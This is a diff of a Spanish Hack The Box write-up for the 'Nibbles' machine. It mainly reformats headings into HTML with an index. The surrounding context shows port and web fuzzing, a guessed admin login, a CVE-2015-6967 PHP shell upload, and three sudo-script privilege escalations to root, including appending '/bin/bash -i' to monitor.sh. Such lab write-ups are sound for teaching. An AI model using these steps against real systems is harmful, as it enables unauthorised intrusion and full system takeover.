@@ -24,10 +24,61 @@ tags:
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-nibbles/nibbles_logo.png)
+
 Esta fue una máquina bastante sencilla, en la que vamos a analizar el código fuente de la página web que está activa en el puerto **HTTP**, ahí nos indica que podemos ver una subpágina que no aparecerá si hacemos **Fuzzing**, una vez que nos metamos ahí, encontraremos que esta subpágina utiliza el servicio **Nibbleblog**. Cuando investiguemos este servicio, sabremos que es un blog creado por una **CMD** y si hacemos **Fuzzing** normal y ambientado a subpáginas **PHP**, encontraremos algunas a las cuales podremos enumerar y así encontrar un usuario y un login, en dicho login utilizaremos el usuario que encontramos y como contraseña el nombre de la máquina para poder acceder al servicio **Nibbleblog**. Una vez dentro, analizaremos el Exploit **CVE-2015-6967**, el cual nos indicara que podemos añadir una **Reverse Shell** hecha en **PHP**, para poder conectarnos de manera remota a la máquina víctima como usuarios. Una vez conectados, utilizaremos un script en **Bash** con permisos de **SUDO** para poder escalar privilegios como **Root**.
 
-# Recopilación de Información
-## Traza ICMP
+
+<br>
+<hr>
+<div id="Indice">
+	<h1>Índice</h1>
+	<ul>
+		<li><a href="#Recopilacion">Recopilación de Información</a></li>
+			<ul>
+				<li><a href="#Ping">Traza ICMP</a></li>
+				<li><a href="#Puertos">Escaneo de Puertos</a></li>
+				<li><a href="#Servicios">Escaneo de Servicios</a></li>
+			</ul>
+		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
+			<ul>
+				<li><a href="#HTTP">Analizando Puerto 80</a></li>
+				<li><a href="#Fuente">Analizando Codigo Fuente de la Página Web</a></li>
+				<li><a href="#Fuzz">Fuzzing</a></li>
+			</ul>
+		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
+			<ul>
+				<li><a href="#Web">Enumeración Web</a></li>
+				<li><a href="#Exploit">Buscando un Exploit</a></li>
+			</ul>
+		<li><a href="#Post">Post Explotación</a></li>
+			<ul>
+				<li><a href="#Privesc">Escalando Privilegios de 3 Formas con Archivo .sh</a></li>
+				<ul>
+                                        <li><a href="#Forma1">Forma 1: Convertirse en Root con /bin/bash</a></li>
+					<li><a href="#Forma2">Forma 2: Cambiar los Permisos de la Bash</a></li>
+					<li><a href="#Forma3">Forma 3: Suplantación de Archivo .sh</a></li>
+                                </ul>
+			</ul>
+		<li><a href="#Otras">Otras Formas</a></li>
+		<li><a href="#Links">Links de Investigación</a></li>
+	</ul>
+</div>
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="Ping">Traza ICMP</h2>
+
 Vamos a realizar un ping para saber si la máquina está activa y en base al TTL sabremos que SO opera en dicha máquina.
 ```
 ping -c 4 10.10.10.75 
@@ -43,7 +94,8 @@ rtt min/avg/max/mdev = 129.512/141.335/153.128/9.122 ms
 ```
 Por el TTL, sabemos que la máquina usa Linux. Ahora, hagamos los escaneos de puertos y servicios.
 
-## Escaneo de Puertos
+<h2 id="Puertos">Escaneo de Puertos</h2>
+
 ```
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.75 -oG allPorts
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
@@ -77,7 +129,8 @@ Nmap done: 1 IP address (1 host up) scanned in 27.93 seconds
 
 Veo solamente dos puertos, que, pues ya conocemos. Cómo no tenemos las credenciales del SSH, tendremos que irnos a la página web del puerto HTTP, vamos a hacer el escaneo de servicios.
 
-## Escaneo de Servicios
+<h2 id="Servicios">Escaneo de Servicios</h2>
+
 ```
 nmap -sC -sV -p22,80 10.10.10.75 -oN targeted                           
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 13:08 CST
@@ -105,8 +158,21 @@ Nmap done: 1 IP address (1 host up) scanned in 12.96 seconds
 
 Bien, aparece el servicio **Apache**, pero mejor analicemos la página web.
 
-# Análisis de Vulnerabilidades
-## Analizando Puerto 80
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="HTTP">Analizando Puerto 80</h2>
+
 Entremos a la página web.
 
 ![](/assets/images/htb-writeup-nibbles/Captura1.png)
@@ -175,7 +241,8 @@ Requests/sec.: 0
 
 A kbron...No, pues no, lo único que se me ocurre es ver el código fuente.
 
-## Analizando Codigo Fuente de la Página Web
+<h2 id="Fuente">Analizando Codigo Fuente de la Página Web</h2>
+
 Para entrar ahí, simplemente presiona **crtl + u**. Pues entremos.
 
 ![](/assets/images/htb-writeup-nibbles/Captura3.png)
@@ -190,7 +257,8 @@ Aparece una página que supongo es hecha por default, pero viene el servicio **N
 
 Entonces, se me hace que esta tiene sus propias subpáginas, ahora si repitamos el **Fuzzing**.
 
-## Fuzzing
+<h2 id="Fuzz">Fuzzing</h2>
+
 ```
 wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.75/nibbleblog/FUZZ/
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -240,8 +308,20 @@ Requests/sec.: 0
 
 Hay algunas subpáginas que me llaman la atención, como la de **admin** y **content**. Vamos a verlas.
 
-# Explotación de Vulnerabilidades
-## Enumeración Web
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
+<h2 id="Web">Enumeración Web</h2>
+
 ![](/assets/images/htb-writeup-nibbles/Captura5.png)
 
 Ok, vamos a enumerar un poquito lo que hay aquí. Pues no encontré nada que fuera interesante, pero si vi que hay muchos archivo PHP, entonces hagamos un **Fuzzing** para ver si hay subpáginas PHP:
@@ -320,7 +400,8 @@ OJO, esto a lo mejor te puede funcionar en un ambiente real, no esta de más pro
 
 Ahora si, busquemos un Exploit.
 
-## Buscando un Exploit
+<h2 id="Exploit">Buscando un Exploit</h2>
+
 En la búsqueda, encontré uno que nos puede servir:
 * https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html
 
@@ -381,7 +462,18 @@ drwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano
 nibbler@Nibbles:/home/nibbler$ cat user.txt
 ```
 
-# Post Explotación
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Post" style="text-align:center;">Post Explotación</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
 Hay 3 maneras para convertirnos en root. Pero para eso necesitamos saber qué permisos tenemos como SUDO:
 ```
 nibbler@Nibbles:/home/nibbler$ sudo -l
@@ -393,7 +485,8 @@ User nibbler may run the following commands on Nibbles:
 ```
 Un archivo **.sh** y también hay un archivo comprimido que podemos descomprimir, este archivo incluye el **monitor.sh**. Vamos a hacer las 2 primeras formas de escalar privilegios, descomprimamos el archivo:
 
-## Escalando Privilegios de 3 Formas con Archivo .sh
+<h2 id="Privesc">Escalando Privilegios de 3 Formas con Archivo .sh</h2>
+
 **IMPORTANTE**
 
 La tercera forma debe ser sin que se descomprima el archivo **personal.zip**, prueba la que quieras. Bien, descomprime el archivo:
@@ -421,7 +514,8 @@ drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
 ```
 Ahora sí, probemos las 2 formas con el archivo descomprimido. Pero antes, entra a ese archivo y borra o comenta el comando **clear** que está casi al principio.
 
-### Forma 1: Convertirse en Root con /bin/bash
+<h2 id="Forma1">Forma 1: Convertirse en Root con /bin/bash</h2>
+
 Para esto, vamos a meter el siguiente comando en el script:
 ```
 nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "/bin/bash -i" >> monitor.sh 
@@ -442,7 +536,8 @@ root
 Esta forma, yo no la conocía, la encontré de aquí:
 * https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d
 
-### Forma 2: Cambiar los Permisos de la Bash
+<h2 id="Forma2">Forma 2: Cambiar los Permisos de la Bash</h2>
+
 Veamos los permisos de la **Bash**:
 ```
 nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la /bin/bash
@@ -473,7 +568,8 @@ bash-4.3# whoami
 root
 ```
 
-### Forma 3: Suplantación de Archivo .sh
+<h2 id="Forma3">Forma 3: Suplantación de Archivo .sh</h2>
+
 Primero, tratemos de crear las dos carpetas que deberían crearse con el descomprimido, si nos deja, vamos bien y si no, lo intentamos con las formas anteriores:
 ```
 nibbler@Nibbles:/home/nibbler$ mkdir -p /home/nibbler/personal/stuff
@@ -516,7 +612,19 @@ bash-4.3# cat root.txt
 ```
 ¡Y listo! Ya completamos esta máquina.
 
-# Otras Formas
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Otras" style="text-align:center;">Otras Formas</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
 Existe una forma de usar un Exploit de Metasploit, que te automatiza la forma de acceder a la máquina. Lo único que necesitas es tener una **Reverse Shell** de **PHP** (como la de **pentestmonkey**) y usar el Exploit de Python de este **GitHub**:
 * https://github.com/dix0nym/CVE-2015-6967
 
@@ -558,11 +666,21 @@ $ whoami
 nibbler
 ```
 
-## Links de Investigación
+<br>
+<br>
+<div style="position: relative;">
+ <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+
 * https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html
 * https://www.exploit-db.com/exploits/38489
 * https://www.tecmint.com/linux-server-health-monitoring-script/
 * https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d
 * https://berserkwings.github.io/PentestNotes/#
 
+
+<br>
 # FIN
